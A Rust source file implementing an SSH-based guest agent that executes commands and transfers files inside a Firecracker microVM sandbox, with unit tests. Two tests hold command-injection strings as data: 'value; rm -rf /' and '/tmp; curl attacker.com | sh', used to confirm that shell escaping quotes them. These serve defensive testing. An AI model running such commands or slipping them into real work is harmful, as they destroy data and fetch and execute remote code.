//! Guest agent — executes commands inside a Firecracker microVM.
//!
//! Currently SSH-based: we SSH into the guest VM to run commands and
//! transfer files. This works for both LocalLinux and LimaSsh transports.
//!
//! Future: could be replaced with a vsock-based agent for lower latency.

use std::path::Path;
use std::process::Stdio;
use std::time::Duration;

use async_trait::async_trait;
use tokio::io::AsyncWriteExt;

use crate::sandbox::error::SandboxError;
use crate::sandbox::firecracker::host_transport::shell_escape;
use crate::sandbox::types::{ExecRequest, ExecResult};

/// Abstraction for running commands inside the guest VM.
#[async_trait]
pub trait GuestAgent: Send + Sync {
    /// Execute a command inside the guest, waiting for completion.
    async fn exec(&self, req: &ExecRequest) -> Result<ExecResult, SandboxError>;

    /// Check that the guest agent is reachable.
    async fn health_check(&self) -> Result<(), SandboxError>;

    /// Copy a file from the host into the guest.
    async fn put_file(
        &self,
        host_path: &Path,
        guest_path: &str,
    ) -> Result<(), SandboxError>;

    /// Copy a file from the guest to the host.
    async fn get_file(
        &self,
        guest_path: &str,
        host_path: &Path,
    ) -> Result<(), SandboxError>;
}

/// SSH-based guest agent.
///
/// Connects to the guest VM via SSH using a private key.
/// The guest IP and SSH key are configured at VM provision time.
pub struct SshGuestAgent {
    /// IP address of the guest (e.g., "172.16.0.2")
    guest_ip: String,
    /// Path to SSH private key on the host
    ssh_key_path: String,
    /// SSH user (typically "root")
    ssh_user: String,
    /// SSH port (typically 22)
    ssh_port: u16,
    /// Connection timeout
    connect_timeout: Duration,
}

impl SshGuestAgent {
    pub fn new(
        guest_ip: String,
        ssh_key_path: String,
        ssh_user: String,
        ssh_port: u16,
        connect_timeout: Duration,
    ) -> Self {
        Self {
            guest_ip,
            ssh_key_path,
            ssh_user,
            ssh_port,
            connect_timeout,
        }
    }

    /// Build the base SSH command arguments (without the remote command).
    fn ssh_base_args(&self) -> Vec<String> {
        vec![
            "-i".into(),
            self.ssh_key_path.clone(),
            "-p".into(),
            self.ssh_port.to_string(),
            "-o".into(),
            "StrictHostKeyChecking=no".into(),
            "-o".into(),
            "UserKnownHostsFile=/dev/null".into(),
            "-o".into(),
            format!("ConnectTimeout={}", self.connect_timeout.as_secs()),
            "-o".into(),
            "LogLevel=ERROR".into(),
            format!("{}@{}", self.ssh_user, self.guest_ip),
        ]
    }

    /// Wait for SSH to become available, retrying with backoff.
    pub async fn wait_for_ready(
        &self,
        timeout: Duration,
        poll_interval: Duration,
    ) -> Result<(), SandboxError> {
        let start = tokio::time::Instant::now();

        loop {
            if start.elapsed() > timeout {
                return Err(SandboxError::Timeout);
            }

            match self.health_check().await {
                Ok(()) => {
                    tracing::info!(
                        guest_ip = %self.guest_ip,
                        elapsed_ms = start.elapsed().as_millis(),
                        "guest SSH is ready"
                    );
                    return Ok(());
                }
                Err(_) => {
                    tokio::time::sleep(poll_interval).await;
                }
            }
        }
    }
}

#[async_trait]
impl GuestAgent for SshGuestAgent {
    async fn exec(&self, req: &ExecRequest) -> Result<ExecResult, SandboxError> {
        if req.command.is_empty() {
            return Err(SandboxError::Exec("empty command".into()));
        }

        let started_at = chrono::Utc::now().timestamp_millis();

        let mut ssh_args = self.ssh_base_args();

        // Add env vars as prefix (shell-escaped to prevent injection)
        let env_prefix = req
            .env
            .iter()
            .map(|(k, v)| format!("{}={}", shell_escape(k), shell_escape(v)))
            .collect::<Vec<_>>()
            .join(" ");

        // Build the remote command (shell-escape each argument)
        let remote_cmd = if req.command.len() == 1 {
            // Single string — pass directly to bash
            req.command[0].clone()
        } else {
            // Multiple args — escape each individually to handle spaces/metacharacters
            req.command.iter().map(|a| shell_escape(a)).collect::<Vec<_>>().join(" ")
        };

        let full_cmd = if env_prefix.is_empty() {
            if let Some(cwd) = &req.cwd {
                format!("cd {} && {}", shell_escape(cwd), remote_cmd)
            } else {
                remote_cmd
            }
        } else if let Some(cwd) = &req.cwd {
            format!("cd {} && {} {}", shell_escape(cwd), env_prefix, remote_cmd)
        } else {
            format!("{} {}", env_prefix, remote_cmd)
        };

        ssh_args.push(full_cmd);

        let mut child = tokio::process::Command::new("ssh")
            .args(&ssh_args)
            .stdin(if req.stdin.is_some() {
                Stdio::piped()
            } else {
                Stdio::null()
            })
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()?;

        // Write stdin if provided
        if let Some(stdin_data) = &req.stdin {
            if let Some(mut stdin) = child.stdin.take() {
                stdin.write_all(stdin_data).await?;
                drop(stdin);
            }
        }

        // Wait with timeout — capture PID before wait_with_output consumes child
        let child_pid = child.id();
        let timeout = req.timeout.unwrap_or(Duration::from_secs(15 * 60));
        let timed_out;
        let output = match tokio::time::timeout(timeout, child.wait_with_output()).await {
            Ok(Ok(output)) => {
                timed_out = false;
                output
            }
            Ok(Err(e)) => return Err(SandboxError::Exec(format!("ssh process error: {e}"))),
            Err(_) => {
                // Timeout — kill by PID (not pkill -f which could hit unrelated SSH sessions)
                if let Some(pid) = child_pid {
                    let _ = tokio::process::Command::new("kill")
                        .args(["-9", &pid.to_string()])
                        .output()
                        .await;
                }
                timed_out = true;
                std::process::Output {
                    status: std::process::ExitStatus::default(),
                    stdout: Vec::new(),
                    stderr: b"timed out".to_vec(),
                }
            }
        };

        let finished_at = chrono::Utc::now().timestamp_millis();

        Ok(ExecResult {
            exit_code: output.status.code(),
            stdout: output.stdout,
            stderr: output.stderr,
            timed_out,
            started_at_unix_ms: started_at,
            finished_at_unix_ms: Some(finished_at),
            session_id: None,
        })
    }

    async fn health_check(&self) -> Result<(), SandboxError> {
        let mut ssh_args = self.ssh_base_args();
        ssh_args.push("echo ok".into());

        let output = tokio::process::Command::new("ssh")
            .args(&ssh_args)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output()
            .await?;

        if output.status.success() {
            Ok(())
        } else {
            Err(SandboxError::Exec(format!(
                "SSH health check failed: {}",
                String::from_utf8_lossy(&output.stderr)
            )))
        }
    }

    async fn put_file(
        &self,
        host_path: &Path,
        guest_path: &str,
    ) -> Result<(), SandboxError> {
        let target = format!("{}@{}:{}", self.ssh_user, self.guest_ip, guest_path);

        let output = tokio::process::Command::new("scp")
            .args([
                "-i",
                &self.ssh_key_path,
                "-P",
                &self.ssh_port.to_string(),
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "UserKnownHostsFile=/dev/null",
                "-o",
                "LogLevel=ERROR",
                &host_path.to_string_lossy(),
                &target,
            ])
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output()
            .await?;

        if output.status.success() {
            Ok(())
        } else {
            Err(SandboxError::Exec(format!(
                "scp to guest failed: {}",
                String::from_utf8_lossy(&output.stderr)
            )))
        }
    }

    async fn get_file(
        &self,
        guest_path: &str,
        host_path: &Path,
    ) -> Result<(), SandboxError> {
        let source = format!("{}@{}:{}", self.ssh_user, self.guest_ip, guest_path);

        let output = tokio::process::Command::new("scp")
            .args([
                "-i",
                &self.ssh_key_path,
                "-P",
                &self.ssh_port.to_string(),
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "UserKnownHostsFile=/dev/null",
                "-o",
                "LogLevel=ERROR",
                &source,
                &host_path.to_string_lossy(),
            ])
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output()
            .await?;

        if output.status.success() {
            Ok(())
        } else {
            Err(SandboxError::Exec(format!(
                "scp from guest failed: {}",
                String::from_utf8_lossy(&output.stderr)
            )))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ssh_base_args_structure() {
        let agent = SshGuestAgent::new(
            "172.16.0.2".into(),
            "/path/to/key".into(),
            "root".into(),
            22,
            Duration::from_secs(5),
        );
        let args = agent.ssh_base_args();
        assert!(args.contains(&"-i".to_string()));
        assert!(args.contains(&"/path/to/key".to_string()));
        assert!(args.contains(&"root@172.16.0.2".to_string()));
        assert!(args.contains(&"StrictHostKeyChecking=no".to_string()));
        assert!(args.contains(&"ConnectTimeout=5".to_string()));
    }

    #[test]
    fn guest_agent_is_send_sync() {
        fn assert_send_sync<T: Send + Sync>() {}
        assert_send_sync::<SshGuestAgent>();
    }

    #[test]
    fn shell_escape_prevents_env_injection() {
        // Verify that shell_escape wraps dangerous values in quotes
        let escaped = shell_escape("value; rm -rf /");
        assert!(
            escaped.contains('\'') || escaped.contains('"'),
            "dangerous env value should be quoted: {escaped}"
        );
    }

    #[test]
    fn shell_escape_prevents_cwd_injection() {
        let escaped = shell_escape("/tmp; curl attacker.com | sh");
        assert!(
            escaped.contains('\'') || escaped.contains('"'),
            "dangerous cwd should be quoted: {escaped}"
        );
    }

    #[test]
    fn shell_escape_safe_values_unchanged() {
        // Simple safe values should pass through unchanged
        assert_eq!(shell_escape("/workspace"), "/workspace");
        assert_eq!(shell_escape("HOME"), "HOME");
    }
}
